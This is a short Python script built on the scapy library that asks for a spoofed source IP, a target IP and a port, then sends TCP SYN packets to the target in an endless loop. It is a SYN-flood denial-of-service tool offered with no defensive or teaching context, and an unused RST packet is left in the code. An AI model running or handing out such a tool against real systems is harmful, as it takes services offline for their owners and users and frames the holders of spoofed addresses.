#-*- coding: utf-8 -*-
from scapy.all import *

def synFlood(spoofIP, targetIP, targetPort):
    ip=IP(src=spoofIP, dst=targetIP) 
    syn=ip/TCP(sport=12345, dport=targetPort, flags="S", seq=12345)
    rst=ip/TCP(sport=12345, dport=targetPort, flags="R", seq=12345)
    while(1):
        packet=syn
        p=sr1(packet)
        
def main():
    spoofIP=raw_input("Input Spoof IP : ")
    targetIP=raw_input("Input Destination IP : ")
    targetPort=raw_input("Input Destination Port : ")
    synFlood(spoofIP, targetIP, int(targetPort))
    
if __name__=="__main__":
    main()